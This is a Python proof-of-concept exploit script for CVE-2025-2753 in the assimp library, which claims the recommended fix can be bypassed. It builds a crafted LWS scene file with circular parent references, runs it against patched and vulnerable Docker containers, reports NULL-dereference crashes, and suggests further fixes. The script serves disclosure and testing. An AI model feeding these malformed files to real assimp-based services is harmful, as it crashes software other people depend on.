#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Assimp CVE-2025-2753 Fix Bypass — NULL Pointer Dereference
# CVE            : CVE-2025-2753
# Vendor         : assimp (Open Source)
# Product        : Open Asset Import Library (assimp)
# Affected       : v5.4.3 through v6.0.4 (0-day, unfixed)
# Type           : CWE-457 - Use of Uninitialized Variable (Fix Bypass)
# CVSS           : 6.3 (MEDIUM)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-2753 — Bypass PoC: Recommended Fix Is Incomplete

Demonstrates that the recommended fix (value-initialization + CopyPtrArray
null-check) is incomplete. Two crash paths remain:

ATTACK CHAIN:
  1. Bypass 1: ProcessCamera(NULL) dereferences pCam->mLookAt → SEGV at near-NULL
  2. Bypass 2: ValidateDSProcess inner loop dereferences NULL light entry → SEGV at 0x0
  3. Both paths bypass the CopyPtrArray null-check — different code paths, same DoS

PREREQUISITES:
  - Docker with cve-2025-2753-patched container running
  - Optional: cve-2025-2753-vulnerable container for comparison
  - No external dependencies (stdlib only)

REFERENCES:
  - CVE-2025-2753
  - https://github.com/assimp/assimp/issues/6014
"""

import subprocess
import sys
import os
import tempfile


def craft_camera_bypass_lws():
    """
    Generate a minimal LWS file that bypasses the value-init fix via camera NULL deref.

    The fix zero-initializes the camera array, but MakeLeftHandedProcess::ProcessCamera()
    does NOT check for NULL. It dereferences pCam->mLookAt on a NULL pointer → SEGV.

    File structure:
      - Object 0 (root, no parent) — only reachable root
      - Object 1 (ParentObject 2) — circular with Object 2
      - Object 2 (ParentObject 1) — circular with Object 1
      - Camera 0 (ParentObject 1) — child of unreachable Object 1

    Result: mNumCameras=1, mCameras[0]=NULL (value-initialized) → ProcessCamera(NULL) → SEGV
    """
    lines = [
        "LWSC",
        "1",
        "",
        "AddNullObject root_node",
        "",
        "AddNullObject circular_node_b",
        "ParentObject 2",
        "",
        "AddNullObject circular_node_c",
        "ParentObject 1",
        "",
        "AddCamera",
        "ParentObject 1",
        "",
    ]
    return "\n".join(lines) + "\n"


def run_container_test(container_name, lws_path_in_container, build_type, label):
    """Run the assimp tool inside the container and return results."""
    if build_type == "asan":
        cmd = (
            f"LD_LIBRARY_PATH=/opt/assimp/build-asan/bin "
            f"assimp-asan info {lws_path_in_container} 2>&1; "
            f"echo EXIT_CODE=$?"
        )
    else:
        cmd = (
            f"LD_LIBRARY_PATH=/opt/assimp/build-release/bin "
            f"assimp-release info {lws_path_in_container} 2>&1; "
            f"echo EXIT_CODE=$?"
        )

    try:
        result = subprocess.run(
            ["docker", "exec", container_name, "bash", "-c", cmd],
            capture_output=True, text=True, timeout=30
        )
        output = result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        output = "TIMEOUT"
    except Exception as e:
        output = f"ERROR: {e}"

    crashed = (
        "SEGV" in output
        or "EXIT_CODE=139" in output
        or "EXIT_CODE=134" in output
        or "Segmentation fault" in output
    )

    # Determine crash location
    crash_location = "unknown"
    if "ProcessCamera" in output:
        crash_location = "MakeLeftHandedProcess::ProcessCamera (ConvertToLHProcess.cpp:235)"
    elif "ValidateDSProcess" in output or "DoValidationEx" in output:
        crash_location = "ValidateDSProcess::DoValidationEx (ValidateDataStructure.cpp:151)"
    elif "CopyPtrArray" in output:
        crash_location = "CopyPtrArray (SceneCombiner.cpp) — ORIGINAL crash path"
    elif "SceneCombiner::Copy" in output:
        crash_location = "SceneCombiner::Copy — ORIGINAL crash path"

    # Determine crash address
    crash_addr = "unknown"
    if "0x000000000000" in output:
        crash_addr = "0x000000000000 (NULL — value-initialized)"
    elif "0x000000000404" in output:
        crash_addr = "0x000000000404 (near-NULL — value-initialized struct offset)"
    elif "0xbebebebebebebebe" in output or "0x17d7d7e7d7d7d7d7" in output:
        crash_addr = output.split("unknown address ")[1].split(" ")[0] if "unknown address " in output else "garbage (uninitialized heap)"
    elif "unknown address" in output:
        crash_addr = output.split("unknown address ")[1].split(" ")[0]

    return {
        "output": output,
        "crashed": crashed,
        "crash_location": crash_location,
        "crash_addr": crash_addr,
    }


def copy_file_to_container(container_name, local_data, container_path):
    """Write data to a temp file and copy into the container."""
    with tempfile.NamedTemporaryFile(suffix=".lws", mode="w", delete=False) as f:
        f.write(local_data)
        tmp_path = f.name

    try:
        subprocess.run(
            ["docker", "cp", tmp_path, f"{container_name}:{container_path}"],
            capture_output=True, timeout=10, check=True
        )
    finally:
        os.unlink(tmp_path)


def check_container(name):
    """Check if a container is running."""
    try:
        result = subprocess.run(
            ["docker", "inspect", "-f", "{{.State.Running}}", name],
            capture_output=True, text=True, timeout=10
        )
        return result.stdout.strip() == "true"
    except Exception:
        return False


def test_bypass(container_name, bypass_name, lws_path, is_patched):
    """Run a bypass test and return results."""
    tag = "PATCHED" if is_patched else "VULNERABLE"
    print(f"\n  [{tag}] Testing {bypass_name}...")

    # Test ASan build
    result = run_container_test(container_name, lws_path, "asan", bypass_name)

    if result["crashed"]:
        print(f"  [{tag}] ASan:    ✅ CRASHED at {result['crash_location']}")
        print(f"  [{tag}]          Address: {result['crash_addr']}")
    else:
        print(f"  [{tag}] ASan:    ❌ No crash")

    # Test release build
    result_rel = run_container_test(container_name, lws_path, "release", bypass_name)

    if result_rel["crashed"]:
        print(f"  [{tag}] Release: ✅ CRASHED (exit code in output)")
    else:
        print(f"  [{tag}] Release: ❌ No crash")

    return result, result_rel


def main():
    patched_container = sys.argv[1] if len(sys.argv) > 1 else "cve-2025-2753-patched"
    vuln_container = sys.argv[2] if len(sys.argv) > 2 else "cve-2025-2753-vulnerable"

    print("=" * 76)
    print("  CVE-2025-2753 BYPASS PoC — Fix Incompleteness Demonstration")
    print("=" * 76)
    print()
    print("FIX APPLIED:")
    print("  1. LWSLoader.cpp: new Type*[num]() — value-initialization (NULL instead of garbage)")
    print("  2. SceneCombiner.cpp: CopyPtrArray null-check on src[i] before Copy()")
    print()
    print("BYPASS VECTORS:")
    print("  1. Camera: MakeLeftHandedProcess::ProcessCamera() has no NULL check")
    print("     → ProcessCamera(NULL) dereferences pCam->mLookAt → SEGV at near-NULL")
    print()
    print("  2. Lights: ValidateDSProcess::DoValidationEx() inner loop has no NULL check")
    print("     → parray[a]->mName dereferences NULL entry → SEGV at 0x0")
    print()

    # Check containers
    has_patched = check_container(patched_container)
    has_vuln = check_container(vuln_container)

    if not has_patched:
        print(f"[!] FATAL: Patched container '{patched_container}' is not running.")
        print(f"    Build and start it with:")
        print(f"    docker compose up -d patched")
        sys.exit(1)

    # Prepare bypass files
    print("[*] Preparing bypass payloads...")

    # Bypass 1: Camera variant (hand-crafted)
    camera_lws = craft_camera_bypass_lws()
    camera_path = "/opt/poc/bypass_camera.lws"
    copy_file_to_container(patched_container, camera_lws, camera_path)
    print(f"    Bypass 1 (camera): {len(camera_lws)} bytes → {camera_path}")

    if has_vuln:
        copy_file_to_container(vuln_container, camera_lws, camera_path)

    # Bypass 2: Original crash.lws already in containers at /opt/poc/crash.lws
    light_path = "/opt/poc/crash.lws"
    print(f"    Bypass 2 (lights): pre-existing → {light_path}")

    # ================================================================
    # Test Bypass 1: Camera NULL dereference (ProcessCamera)
    # ================================================================
    print()
    print("-" * 76)
    print("BYPASS 1: Camera NULL Dereference via MakeLeftHandedProcess::ProcessCamera")
    print("-" * 76)
    print("Payload: 151-byte hand-crafted LWS with circular object references")
    print("Expected crash: SEGV at near-NULL address in ProcessCamera (line 235)")

    bypass1_patched_asan, bypass1_patched_rel = test_bypass(
        patched_container, "Bypass1-Camera", camera_path, is_patched=True
    )

    if has_vuln:
        bypass1_vuln_asan, bypass1_vuln_rel = test_bypass(
            vuln_container, "Bypass1-Camera", camera_path, is_patched=False
        )

    # ================================================================
    # Test Bypass 2: Light NULL dereference (ValidateDSProcess)
    # ================================================================
    print()
    print("-" * 76)
    print("BYPASS 2: Light NULL Dereference via ValidateDSProcess::DoValidationEx")
    print("-" * 76)
    print("Payload: Original 661-byte crash.lws from issue #6014")
    print("Expected crash: SEGV at 0x0 in DoValidationEx (line 151)")

    bypass2_patched_asan, bypass2_patched_rel = test_bypass(
        patched_container, "Bypass2-Lights", light_path, is_patched=True
    )

    if has_vuln:
        bypass2_vuln_asan, bypass2_vuln_rel = test_bypass(
            vuln_container, "Bypass2-Lights", light_path, is_patched=False
        )

    # ================================================================
    # Summary
    # ================================================================
    print()
    print("=" * 76)
    print("  BYPASS RESULTS SUMMARY")
    print("=" * 76)
    print()

    # Bypass 1 results
    b1_patched = bypass1_patched_asan["crashed"]
    b1_location = bypass1_patched_asan["crash_location"]
    b1_addr = bypass1_patched_asan["crash_addr"]

    print(f"  Bypass 1 (Camera → ProcessCamera NULL deref):")
    print(f"    Patched container: {'✅ CRASH' if b1_patched else '❌ No crash'}")
    if b1_patched:
        print(f"    Crash location:   {b1_location}")
        print(f"    Crash address:    {b1_addr}")
    if has_vuln:
        b1_vuln = bypass1_vuln_asan["crashed"]
        b1_vuln_loc = bypass1_vuln_asan["crash_location"]
        print(f"    Vulnerable:       {'✅ CRASH' if b1_vuln else '❌ No crash'} at {b1_vuln_loc}")
    print()

    # Bypass 2 results
    b2_patched = bypass2_patched_asan["crashed"]
    b2_location = bypass2_patched_asan["crash_location"]
    b2_addr = bypass2_patched_asan["crash_addr"]

    print(f"  Bypass 2 (Lights → ValidateDSProcess NULL deref):")
    print(f"    Patched container: {'✅ CRASH' if b2_patched else '❌ No crash'}")
    if b2_patched:
        print(f"    Crash location:   {b2_location}")
        print(f"    Crash address:    {b2_addr}")
    if has_vuln:
        b2_vuln = bypass2_vuln_asan["crashed"]
        b2_vuln_loc = bypass2_vuln_asan["crash_location"]
        print(f"    Vulnerable:       {'✅ CRASH' if b2_vuln else '❌ No crash'} at {b2_vuln_loc}")
    print()

    # Overall assessment
    any_bypass = b1_patched or b2_patched
    if any_bypass:
        print("  ┌─────────────────────────────────────────────────────────┐")
        print("  │  FIX IS INCOMPLETE — BYPASS CONFIRMED                  │")
        print("  │                                                         │")
        print("  │  The value-initialization + CopyPtrArray null-check    │")
        print("  │  fix does NOT prevent denial-of-service crashes.       │")
        print("  │  NULL pointers are still dereferenced by other code    │")
        print("  │  paths that lack NULL checks.                          │")
        print("  │                                                         │")
        print("  │  Impact: DoS (crash) — same severity as original CVE  │")
        print("  └─────────────────────────────────────────────────────────┘")
        print()
        print("  RECOMMENDED ADDITIONAL FIXES:")
        print("  1. Add NULL check in MakeLeftHandedProcess::ProcessCamera()")
        print("  2. Add NULL check in ValidateDSProcess::DoValidationEx() inner loop")
        print("  3. Adjust mNumLights/mNumCameras after BuildGraph to match actual")
        print("     number of filled slots (root cause fix)")
        print("  4. Use std::vector<Type*> instead of raw arrays throughout")

        if has_vuln and b1_patched:
            # Confirm different crash paths
            vuln_loc = bypass1_vuln_asan.get("crash_location", "")
            patch_loc = bypass1_patched_asan.get("crash_location", "")
            if vuln_loc != patch_loc:
                print()
                print("  DIFFERENTIAL ANALYSIS:")
                print(f"    Vulnerable crashes at: {vuln_loc}")
                print(f"    Patched crashes at:    {patch_loc}")
                print("    → Different crash paths confirm the fix is partially effective")
                print("      but fails to prevent the DoS entirely.")
    else:
        print("  FIX APPEARS ADEQUATE — No bypass found")

    print()

    # Detailed output section
    print("-" * 76)
    print("DETAILED ASAN OUTPUT — Bypass 1 (Camera, Patched Container)")
    print("-" * 76)
    print(bypass1_patched_asan["output"][:4000])
    print()
    print("-" * 76)
    print("DETAILED ASAN OUTPUT — Bypass 2 (Lights, Patched Container)")
    print("-" * 76)
    print(bypass2_patched_asan["output"][:4000])

    return 0 if any_bypass else 1


if __name__ == "__main__":
    sys.exit(main())
